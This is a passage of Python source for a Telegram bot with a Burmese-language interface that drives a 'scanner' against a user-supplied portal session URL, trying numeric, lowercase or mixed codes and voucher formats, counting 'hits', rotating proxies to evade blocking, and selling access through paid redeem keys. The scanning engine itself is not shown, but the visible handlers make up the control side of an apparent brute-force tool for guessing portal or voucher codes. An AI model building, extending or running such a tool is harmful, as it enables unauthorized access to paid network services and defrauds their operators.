        if info["key"] == query_val or str(info["target_id"]) == query_val:
            deleted_count += 1
        else:
            new_active_keys.append(info)
    ACTIVE_KEYS[:] = new_active_keys

    try:
        target_uid = int(query_val)
        if target_uid in APPROVED_USERS and target_uid != ADMIN_ID:
            del APPROVED_USERS[target_uid]
            deleted_count += 1
    except ValueError:
        pass

    if deleted_count > 0:
        await update.message.reply_text(f"✅ အောင်မြင်စွာ ဖျက်ဆီး/ရှင်းလင်းပြီးပါပြီ (`{query_val}`)", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ ထိုသို့သော Key သို့မဟုတ် User ID စာရင်းထဲတွင် မတွေ့ရှိပါ။", parse_mode='Markdown')

async def listkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID:
        await update.message.reply_text("❌ ဤ Command သည် Admin အတွက် သီးသန့်ဖြစ်ပါသည်။")
        return
    
    if not ACTIVE_KEYS:
        await update.message.reply_text("📭 လက်တလော ထုတ်ပေးထားသော Key များ မရှိသေးပါ။")
        return
        
    text = "╔══════════════════════════╗\n"
    text += "║  🔑  𝐀𝐂𝐓𝐈𝐕𝐄  𝐊𝐄𝐘𝐒  🔑  ║\n"
    text += "╚══════════════════════════╝\n\n"
    for info in ACTIVE_KEYS:
        k = info.get("key")
        dur = info.get("duration", 0)
        t_id = info.get("target_id", "Unknown")
        c_time = info.get("created_at", "N/A")
        if dur == "unlimited":
            t_desc = "♾️ Unlimited"
        else:
            t_desc = format_time(dur)
        text += f"┏━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃ 🔑 `{k}`\n"
        text += f"┃ 👤 ID  : `{t_id}`\n"
        text += f"┃ ⏳ Time: {t_desc}\n"
        text += f"┃ 🕒 Made: `{c_time}`\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        
    await update.message.reply_text(text, parse_mode='Markdown')

async def proxy_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID:
        await update.message.reply_text("❌ ဤ Command သည် Admin အတွက် သီးသန့်ဖြစ်ပါသည်။")
        return
    if not proxy_list:
        await update.message.reply_text("❌ Proxy စာရင်း မရှိပါ သို့မဟုတ် အကုန်ရှင်းထားပါသည်။")
        return
    msg = await update.message.reply_text(f"🔍 Checking status of {len(proxy_list)} proxies thoroughly... ခဏစောင့်ပါ ⏳")
    active_count = 0
    results_text = "╔══════════════════════════╗\n"
    results_text += "║  📡  𝐏𝐑𝐎𝐗𝐘  𝐒𝐓𝐀𝐓𝐔𝐒  📡  ║\n"
    results_text += "╚══════════════════════════╝\n\n"
    async def test_and_format(index, p):
        is_ok, latency = await check_single_proxy(p)
        return index, p, is_ok, latency
    tasks = [test_and_format(i, p) for i, p in enumerate(proxy_list)]
    results = await asyncio.gather(*tasks)
    sorted_results = sorted(results, key=lambda x: x[0])
    for index, p, is_ok, latency in sorted_results:
        status_icon = "🟢" if is_ok else "🔴"
        if is_ok:
            active_count += 1
            results_text += f"{index+1}. `{p}` - {status_icon} (`{latency}ms`)\n"
        else:
            results_text += f"{index+1}. `{p}` - {status_icon} (`Dead`)\n"
    results_text += f"\n━━━━━━━━━━━━━━━━━━\n✨ Active: `{active_count}` | Dead: `{len(proxy_list) - active_count}` | Total: `{len(proxy_list)}`"
    try:
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=results_text, parse_mode='Markdown')
    except Exception:
        await update.message.reply_text(results_text, parse_mode='Markdown')

async def dead_clear_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID:
        await update.message.reply_text("❌ ဤ Command သည် Admin အတွက် သီးသန့်ဖြစ်ပါသည်။")
        return
    global proxy_list, proxy_stats
    if not proxy_list:
        await update.message.reply_text("❌ Proxy စာရင်း မရှိပါ။")
        return
    msg = await update.message.reply_text("🧹 Testing and removing dead proxies... ခဏစောင့်ပါ ⏳")
    alive_proxies = []
    for p in proxy_list:
        is_ok, _ = await check_single_proxy(p)
        if is_ok:
            alive_proxies.append(p)
    removed_count = len(proxy_list) - len(alive_proxies)
    proxy_list = alive_proxies
    proxy_stats = {p: proxy_stats[p] for p in proxy_list if p in proxy_stats}
    await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=msg.message_id,
        text=f"✅ **Dead Proxies Cleared Successfully!**\n"
             f"• Removed: `{removed_count}` dead proxies\n"
             f"• Remaining Active Proxies: `{len(proxy_list)}`",
        parse_mode='Markdown'
    )

async def add_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID:
        await update.message.reply_text("❌ ဤ Command သည် Admin အတွက် သီးသန့်ဖြစ်ပါသည်။")
        return
    global proxy_list, proxy_stats
    full_text = update.message.text
    parts = full_text.split(maxsplit=1)
    if len(parts) < 2 and not context.args:
        await update.message.reply_text("❌ Proxy ထည့်ရန် ပုံစံမှားနေပါသည်။ `/addproxy IP:Port`", parse_mode='Markdown')
        return
    raw_input_data = parts[1] if len(parts) > 1 else " ".join(context.args)
    potential_proxies = re.split(r'[\s\n,]+', raw_input_data)
    added_count = 0
    for p_input in potential_proxies:
        p = p_input.strip()
        if not p: continue
        if not p.startswith("http://") and not p.startswith("https://"):
            p = f"http://{p}"
        if p not in proxy_list:
            proxy_list.append(p)
            proxy_stats[p] = {"fail_count": 0}
            added_count += 1
    await update.message.reply_text(f"✅ Successfully added `{added_count}` new proxy(ies)!\n📌 Total Proxies: `{len(proxy_list)}`", parse_mode='Markdown')

async def all_clear_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID:
        await update.message.reply_text("❌ ဤ Command သည် Admin အတွက် သီးသန့်ဖြစ်ပါသည်။")
        return
    global proxy_list, proxy_stats
    proxy_list.clear()
    proxy_stats.clear()
    await update.message.reply_text("🗑 **All proxies have been cleared successfully!**", parse_mode='Markdown')

# ─── GENERAL COMMANDS ──────────────────────────────────────────────

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ACTIVE_KEYS, APPROVED_USERS
    user_id = update.effective_user.id
    args = context.args
    
    if not args:
        await update.message.reply_text("❌ ကျေးဇူးပြု၍ Key ထည့်ပါ။\nဥပမာ: `/redeem STLINK-XXXXX`", parse_mode='Markdown')
        return
        
    key = args[0].strip()
    
    if user_id in APPROVED_USERS and APPROVED_USERS[user_id] != "unlimited":
        if time.time() > APPROVED_USERS[user_id]:
            await update.message.reply_text("❌ သင်၏ PAID KEY သက်တမ်းကုန်ဆုံးနေပါသည်။", parse_mode='Markdown')
            return

    matched_info = None
    for info in ACTIVE_KEYS:
        if info["key"] == key:
            matched_info = info
            break

    if matched_info:
        target_id = matched_info["target_id"]
        duration = matched_info["duration"]
        
        if user_id != target_id:
            await update.message.reply_text(
                f"❌ User id မထည့်ထားရင် paid ဝယ်ယူပါ⛔@nyatvip\n\n"
                f"ဤ Key သည် သင့်အတွက် မဟုတ်ပါ။ (သီးသန့် User ID: `{target_id}` သာ သုံးနိုင်သည်)",
                parse_mode='Markdown'
            )
            return
            
        if duration == "unlimited":
            APPROVED_USERS[user_id] = "unlimited"
        else:
            expiry_time = time.time() + duration
            APPROVED_USERS[user_id] = expiry_time
            
        ACTIVE_KEYS.remove(matched_info)
        
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ✅  𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐈𝐎𝐍  𝐎𝐊  ✅  ║\n"
            "╚══════════════════════════╝\n\n"
            "🎉 **Activation Successful!**\n"
            "🚀 ယခုမှစ၍ Bot ကို အပြည့်အစုံ အသုံးပြုနိုင်ပါပြီ။\n\n"
            "▶️ `/start` ဖြင့် စတင်ပါ။",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ သင်၏ PAID KEY သက်တမ်းကုန်ဆုံးနေပါသည်။ (သို့) မှားယွင်းနေသော Key ဖြစ်ပါသည်။", parse_mode='Markdown')

async def proxy_on_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update, context): return
    global GLOBAL_PROXY_ENABLED
    GLOBAL_PROXY_ENABLED = True
    await update.message.reply_text("🟢 **Proxy Enabled Successfully!**", parse_mode='Markdown')

async def proxy_off_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update, context): return
    global GLOBAL_PROXY_ENABLED
    GLOBAL_PROXY_ENABLED = False
    await update.message.reply_text("🔴 **Proxy Disabled Successfully! (Direct Connection)**", parse_mode='Markdown')

async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update, context): return
    chat_id = update.effective_chat.id
    if chat_id in scan_tasks and not scan_tasks[chat_id].done():
        if chat_id in scan_stats:
            scan_stats[chat_id]["stop_flag"] = True
        scan_tasks[chat_id].cancel()
        await update.message.reply_text("⏹ Scan stopped successfully!")
    else:
        await update.message.reply_text("⚠️ No scan is currently running.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update, context): return
    chat_id = update.effective_chat.id
    if chat_id not in scan_stats:
        await update.message.reply_text("📊 No scan running.")
        return
    stats = scan_stats[chat_id]
    elapsed = time.time() - stats["start_time"]
    speed = (stats["tried"] / elapsed * 60) if elapsed > 0 else 0
    text = f"📊 **Scan Status**\n🏹 Tried: `{stats['tried']:,}`\n🔥 Hits: `{stats['hits']}`\n⚡ Speed: `{speed:.1f} c/m`"
    await update.message.reply_text(text, parse_mode='Markdown')

# ─── BUTTON CALLBACK HANDLER ──────────────────────────────────────

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_id = update.effective_chat.id
    
    # Handle enter_key_prompt separately (no auth needed for this)
    if data == "enter_key_prompt":
        await query.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  🔑  𝐄𝐍𝐓𝐄𝐑  𝐊𝐄𝐘  🔑  ║\n"
            "╚══════════════════════════╝\n\n"
            "ကျေးဇူးပြု၍ Admin ထံမှ ရရှိသော Key ကို အောက်ပါပုံစံအတိုင်း ပေးပို့ပါ။\n\n"
            "`/redeem သင့်ရဲ့Key`",
            parse_mode='Markdown'
        )
        return
    
    # Check auth for all other buttons
    if not await check_auth(update, context):
        return
    
    # ─── Update Portal Button ───
    if data == "update_portal":
        waiting_for_url.add(chat_id)
        await query.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  🌐  𝐔𝐏𝐃𝐀𝐓𝐄  𝐏𝐎𝐑𝐓𝐀𝐋  🌐  ║\n"
            "╚══════════════════════════╝\n\n"
            "ကျေးဇူးပြု၍ Portal Session URL အသစ်ကို ပို့ပေးပါ:"
        )
        return
    
    # ─── Select Mode Button ───
    elif data == "select_mode":
        await query.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚙️  𝐒𝐄𝐋𝐄𝐂𝐓  𝐌𝐎𝐃𝐄  ⚙️  ║\n"
            "╚══════════════════════════╝\n\n"
            "ကျေးဇူးပြု၍ အသုံးပြုလိုသော Code အမျိုးအစား (Mode) ကို ရွေးချယ်ပါ:",
            reply_markup=get_mode_selection_keyboard()
        )
        return
    
    # ─── Set Mode Buttons ───
    elif data.startswith("setmode_"):
        new_mode = data.replace("setmode_", "")
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]["mode"] = new_mode
        await query.message.reply_text(f"✅ Mode ကို `{new_mode.upper()}` သို့ ပြောင်းလဲပြီးပါပြီ။")
        # Show updated control panel
        await send_control_panel(chat_id, context)
        return
    
    # ─── Back to Panel ───
    elif data == "back_to_panel":
        try:
            await query.message.delete()
        except:
            pass
        await send_control_panel(chat_id, context)
        return
    
    # ─── Add Proxies Button ───
    elif data == "add_proxies":
        if chat_id != ADMIN_ID:
            await query.message.reply_text("❌ Proxy ထည့်ခြင်းကို Admin သာ လုပ်ဆောင်နိုင်ပါသည်။")
            return
        waiting_for_url.add(chat_id)
        user_data.setdefault(chat_id, {})["waiting_proxy"] = True
        await query.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  📡  𝐀𝐃𝐃  𝐏𝐑𝐎𝐗𝐈𝐄𝐒  📡  ║\n"
            "╚══════════════════════════╝\n\n"
            "ကျေးဇူးပြု၍ Proxy များကို အောက်ပါပုံစံအတိုင်း ပို့ပေးပါ:\n"
            "`IP:PORT` (တစ်ကြောင်းချင်း သို့မဟုတ် comma ခြားပြီး)\n\n"
            "ဥပမာ:\n"
            "`192.168.1.1:8080`\n"
            "`192.168.1.2:8080, 192.168.1.3:8080`",
            parse_mode='Markdown'
        )
        return
    
    # ─── Start Scanner Button ───
    elif data == "start_scanner":
        if chat_id not in user_data or "url" not in user_data[chat_id]:
            waiting_for_url.add(chat_id)
            await query.message.reply_text("❌ URL မထည့်ရသေးပါ။ Portal Session URL ကို အရင်ပို့ပေးပါ:")
            return
        
        if chat_id in scan_tasks and not scan_tasks[chat_id].done():
            await query.message.reply_text("⚠️ Scan လုပ်နေပြီးသားပါ။ ⏹ Stop နှိပ်ပြီး ရပ်ပါ။")
            return
        
        # Get current mode from user_data or default to num6
        current_mode = user_data.get(chat_id, {}).get("mode", "num6")
        
        # Convert numX to X format for scanner
        if current_mode.startswith("num"):
            scan_mode = current_mode.replace("num", "")
        elif current_mode.startswith("eng"):
            scan_mode = "lower" + current_mode.replace("eng", "")
        elif current_mode.startswith("mixed"):
            scan_mode = current_mode
        elif current_mode == "voucher":
            scan_mode = "6"
        else:
            scan_mode = "6"
        
        task = asyncio.create_task(run_bot_scanner(chat_id, scan_mode, None, context))
        scan_tasks[chat_id] = task
        return
    
    # ─── Stop Scan Button ───
    elif data == "stop_scan_btn":
        if chat_id in scan_tasks and not scan_tasks[chat_id].done():
            if chat_id in scan_stats:
                scan_stats[chat_id]["stop_flag"] = True
            scan_tasks[chat_id].cancel()
            await query.message.reply_text("⏹ Scan stopped successfully!")
        else:
            await query.message.reply_text("⚠️ No scan is currently running.")
        return

# ─── MESSAGE HANDLER (URL, PROXY INPUT) ────────────────────────────

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    
    chat_id = update.effective_chat.id
    text_content = update.message.text.strip()
    
    # Check if user is waiting for URL input
    if chat_id in waiting_for_url and not text_content.startswith("/"):
        # Check if this is proxy input (starts with digit or contains :)
        is_proxy_input = re.match(r'^[\d\.\:\,]+$', text_content.replace(" ", ""))
        
        if is_proxy_input and ":" in text_content:
            # Add as proxies
            if chat_id != ADMIN_ID:
                await update.message.reply_text("❌ Proxy ထည့်ခြင်းကို Admin သာ လုပ်ဆောင်နိုင်ပါသည်။")
                waiting_for_url.discard(chat_id)
                return
            
            potential_proxies = re.split(r'[\s\n,]+', text_content)
            added_count = 0
            for p_input in potential_proxies:
                p = p_input.strip()
                if not p: continue
                if not p.startswith("http://") and not p.startswith("https://"):
                    p = f"http://{p}"
                if p not in proxy_list:
                    proxy_list.append(p)
                    proxy_stats[p] = {"fail_count": 0}
                    added_count += 1
            waiting_for_url.discard(chat_id)
            if chat_id in user_data:
                user_data[chat_id].pop("waiting_proxy", None)
            await update.message.reply_text(f"✅ Proxy `{added_count}` ခု ထည့်ပြီးပါပြီ။ (စုစုပေါင်း: `{len(proxy_list)}`)", parse_mode='Markdown')
            await send_control_panel(chat_id, context)
            return
        
        elif text_content.startswith("http://") or text_content.startswith("https://"):
            # This is URL input
            waiting_for_url.discard(chat_id)
            if chat_id not in user_data:
                user_data[chat_id] = {}
            user_data[chat_id]["url"] = text_content
            
            await update.message.reply_text(
                f"╔══════════════════════════╗\n"
                f"║  ✅  𝐔𝐑𝐋  𝐒𝐀𝐕𝐄𝐃  ✅  ║\n"
                f"╚══════════════════════════╝\n\n"
                f"`{text_content[:80]}...`",
                parse_mode='Markdown'
            )
            await send_control_panel(chat_id, context)
            return
        else:
            # Invalid input
            await update.message.reply_text("❌ ကျေးဇူးပြု၍ Portal URL (http:// သို့မဟုတ် https:// နဲ့စတဲ့) ကို ပို့ပေးပါ။")
            return
    
    # Normal URL detection (outside waiting_for_url)
    if text_content.startswith("http://") or text_content.startswith("https://"):
        if not await check_auth(update, context):
            return
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]["url"] = text_content
        
        await update.message.reply_text(
            f"╔══════════════════════════╗\n"
            f"║  ✅  𝐔𝐑𝐋  𝐒𝐀𝐕𝐄𝐃  ✅  ║\n"
            f"╚══════════════════════════╝\n\n"
            f"`{text_content[:80]}...`",
            parse_mode='Markdown'
        )
        await send_control_panel(chat_id, context)
        return

# ─── MAIN ──────────────────────────────────────────────────────────

def main():
    load_proxies()
    print("🤖 Starting Telegram Bot Scanner...")
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("proxyon", proxy_on_command))
    app.add_handler(CommandHandler("proxyoff", proxy_off_command))
    app.add_handler(CommandHandler("stop", stop_scan))
    app.add_handler(CommandHandler("status", status))
    
    # Admin Only Commands
    app.add_handler(CommandHandler("genkey", genkey_command))
    app.add_handler(CommandHandler("delkey", delkey_command))
    app.add_handler(CommandHandler("listkey", listkey_command))
    app.add_handler(CommandHandler("proxystatus", proxy_status_command))
    app.add_handler(CommandHandler("deadclearproxy", dead_clear_proxy_command))
    app.add_handler(CommandHandler("addproxy", add_proxy_command))
    app.add_handler(CommandHandler("allclearproxy", all_clear_proxy_command))
    
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("✅ Bot is polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
